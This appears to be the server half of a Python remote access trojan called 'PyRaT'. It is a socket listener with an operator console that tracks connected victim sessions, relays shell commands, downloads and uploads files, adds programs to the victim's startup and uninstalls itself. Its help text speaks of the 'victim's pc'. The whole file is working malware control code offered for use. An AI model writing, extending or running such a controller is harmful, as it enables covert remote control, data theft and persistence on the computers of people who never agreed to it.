import socket
import threading
from time import sleep
import tqdm
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "localhost"
port = 8000

sessions_list = []

sessions = {


}

sessions_sockets = []

mark = ">>> "
def sendCommand(command):
    try:
        current_session.send(bytes(f"{command}", "utf-8"))
    except:
        print("selected client is not longer available")

        disconnect()

def disconnect():

    sessions_sockets.remove(current_session)

    sessions.pop(current_session_username)

    sessions_list.remove(current_session_username)

    mark = ">>> "

def selectSession(username):

    #print(f"username: {username}")
    #print(sessions_list)
    #print(sessions)
    #print(sessions_sockets)
    #print("//////////////////")
    #print(sessions.get(f"{username}"))
    #print("//////////////////")

    try:
        for i in sessions_sockets:
            if i == sessions.get(f"{username}"):
                print("socket matched!")
                global current_session
                current_session = i
                global current_session_username
                current_session_username = username
                print("succesfully selected")
                print(i)
                global mark
                mark = current_session_username + ": "
    except:
        print("error")
def handshake(client):
    username = client.recv(1024).decode("utf-8")
    print(username, " connected!")

    #usernames[session_name].append(session_name + "./." + str(client) + "./.")

    sessions_sockets.append(client)

    sessions[f"{username}"] = client


    sessions_list.append(username)



def main():
    print("PyRaT Server running")
    s.bind((ip, port))
    s.listen(5)
    while True:
        client, address = s.accept()
        print(str(address[0]) + ':' + str(address[1]) + ' connected')
        threading.Thread(target=handshake, args=(client, )).start()


def shell():
    print("shell summoned! To exit type exit")
    while True:
        command = input(">>> ")
        if command == "exit":
            sendCommand("exit")
            break
        else:
            sendCommand(command)
            try:
                print(current_session.recv(1024).decode("utf-8"))
            except:
                print("connection closed!")
                break

def user_input():
    while True:
        cmnd = input(mark)
        if cmnd == "sessions":
            print("Available sessions: \n", sessions_list)
        elif "set session" in cmnd:
            name = cmnd.replace("set session ", "")
            print(name)
            selectSession(name)
        elif "send" in cmnd:
            msg = cmnd.replace("send ", "")
            sendCommand(msg)
        elif "addToStartup" in cmnd:
            sendCommand(cmnd)
            response = current_session.recv(1024).decode("utf-8")
            print(response)
        elif cmnd == "kill":
            sendCommand("kill")
            disconnect()
        elif "shell" in cmnd:
            sendCommand("shell")
            shell()
        elif cmnd == 'download':

            current_session.send(cmnd.encode())
            file = str(input("Enter the filepath to the file: "))
            current_session.send(bytes(file, "utf-8"))
            filename = str(input("save as?: "))
            data = current_session.recv(6000)
            newfile = open(filename, 'wb')
            newfile.write(data)
            newfile.close()
            print("file downloaded successfully and saved to root dir")



        elif cmnd == 'upload':
            current_session.send(cmnd.encode())
            file = str(input("Enter the filepath to the file: "))
            filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
            data = open(file, 'rb')
            filedata = data.read(2147483647)
            current_session.send(filename.encode())
            print("File has been sent")
            current_session.send(filedata)

        elif cmnd == "help":
            print("""
                ###############################################
                sessions - list of all connected clients
                set session <session_name> 
                kill - completly uninstall current session from victim's pc
                shell - summons cmd shell
                addToStartup path=<path_to_file> filename=<filename> add=<True-add to startup, False-del from startup>
                upload - upload file
                download - download file
                help - show this
                ###############################################
                """)



        elif cmnd == "exit":
           quit("user")



if __name__ == '__main__':

    threading.Thread(target=main, args=()).start()
    threading.Thread(target=user_input, args=()).start()